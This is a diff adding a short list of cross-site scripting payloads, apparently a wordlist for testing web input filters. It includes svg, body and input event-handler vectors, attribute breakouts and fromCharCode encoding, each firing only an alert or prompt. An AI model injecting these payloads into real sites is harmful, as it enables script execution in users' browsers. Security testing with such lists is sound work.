@@ -1,0 +1,11 @@
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+#"><img src=/ onerror=alert(2)>
+javascript:prompt(1)
